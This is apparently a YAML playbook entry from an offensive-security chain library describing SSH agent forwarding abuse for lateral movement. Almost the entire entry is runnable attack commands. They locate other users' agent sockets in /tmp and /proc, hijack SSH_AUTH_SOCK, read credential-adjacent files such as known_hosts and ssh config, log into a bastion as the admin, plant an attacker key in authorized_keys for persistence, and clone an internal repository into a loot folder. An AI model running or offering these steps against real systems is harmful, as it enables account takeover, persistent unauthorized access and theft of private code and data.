id: ssh-agent-forwarding-abuse
name: "Lateral — SSH agent forwarding abuse (hijack the socket)"
description: >
  A logged-in admin used `ssh -A` to reach your compromised box → their
  agent socket is in /tmp. Reuse it to authenticate as them to any other
  host their keys reach. No password, no key file, full transparency.
tags: [lateral-movement, ssh, agent-forwarding, post-exploitation, linux]
difficulty: easy

inputs: []

steps:
  - id: find_agent_sockets
    name: "Find every accessible ssh-agent socket"
    inline_command: |
      ls -la /tmp/ssh-* 2>/dev/null
      ls -la /tmp/.ssh-* 2>/dev/null
      # Sometimes in user home / runtime dir:
      find /tmp /run /var/run -name 'agent.*' -o -name 'ssh-agent.*' 2>/dev/null
      # Per-process via /proc:
      for pid in $(pgrep -f 'ssh.*-A'); do
        cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep SSH_AUTH_SOCK
      done
    capture:
      - var: agent_sockets
        regex: '^(/tmp/ssh-[A-Za-z0-9]+/agent\.\d+)$'
        match: all

  - id: hijack_socket
    name: "Hijack the agent socket and list keys"
    inline_command: |
      export SSH_AUTH_SOCK=<socket_path>
      ssh-add -L
    notes: |
      Output shows every key the agent holds (public + comment). If the
      user has DA SSH keys / cloud bastion keys cached, they're yours.
      No password prompt — the agent signs requests automatically.

  - id: enumerate_known_hosts
    name: "Find where these keys might work"
    inline_command: |
      # Their known_hosts file (yours if they ran ssh from this box):
      cat /home/*/known_hosts 2>/dev/null
      cat /home/*/.ssh/known_hosts 2>/dev/null
      # Their SSH config — aliases & bastions:
      cat /home/*/.ssh/config 2>/dev/null

  - id: ssh_with_their_identity
    name: "SSH to a target using the hijacked agent"
    inline_command: |
      export SSH_AUTH_SOCK=<socket_path>
      ssh -A admin@bastion.internal
      # Once on bastion, continue chaining — the forwarding follows you.
      # If you can write to their .ssh/authorized_keys, drop YOUR key for
      # persistence:
      cat >> /home/<user>/.ssh/authorized_keys <<< 'ssh-ed25519 AAAA... attacker@evil'

  - id: persist_via_hidden_listener
    name: "Persist: leave a process that re-binds the socket later"
    inline_command: |
      # When the admin's session ends, agent socket disappears. Snapshot
      # the keys NOW (you have to actually use them; the agent never gives
      # up raw key material). Use them to:
      # - Add your own key to authorized_keys on every reachable host
      # - Schedule a cron job that runs as you
      # - Drop an SSH ControlMaster persistent socket

  - id: agent_request_forwarding
    name: "Sign any blob using the agent (creative use)"
    inline_command: |
      # ssh-agent will sign anything the protocol lets you send. SCP
      # uses an SSH session — but you can also abuse:
      # - git over SSH (push to GitHub as the admin)
      # - rsync over SSH (sync remote into your bucket)
      # - SFTP (download every file from servers reachable by their key)
      export SSH_AUTH_SOCK=<socket_path>
      git -c user.email='admin@target.com' clone git@github.com:org/internal-repo /tmp/loot

references:
  - title: "HackTricks — SSH socket hijack"
    url:   "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ssh-agent-socket-hijack"
  - title: "OpenSSH agent forwarding caveats"
    url:   "https://man.openbsd.org/ssh#A"

next_chains:
  - chain: pivoting-chisel-ligolo
    when:   'reached an internal-network bastion'
    reason: 'Tunnel back out to attack the internal subnet directly.'
  - chain: nmap-recon
    when:   'now on a new host'
    reason: 'Repeat recon from the new vantage point.'
